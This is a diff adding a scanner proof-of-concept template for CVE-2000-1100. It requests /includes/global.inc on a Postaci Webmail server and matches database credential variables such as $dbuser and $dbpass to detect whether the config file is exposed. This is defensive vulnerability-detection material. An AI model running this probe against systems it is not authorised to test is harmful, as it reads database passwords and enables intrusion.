@@ -1,0 +1,31 @@
+[info]
+author = "AVE"
+description = "检测 Postaci Webmail 默认安装中 /includes/global.inc 配置文件是否可被未授权访问，该文件包含数据库用户名和密码等敏感信息"
+id = "POC-AVE-2000-0795"
+name = "Trlinux Postaci Webmail 1.1.3 Password Disclosure PoC"
+severity = "high"
+tags = ["ave-2000-0795"]
+vuln_id = [
+    "CVE-2000-1100",
+    "AVE-2000-0795",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/includes/global.inc"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "$dbhost",
+    "$dbuser",
+    "$dbpass",
+    "mysql_connect",
+    "global.inc",
+]
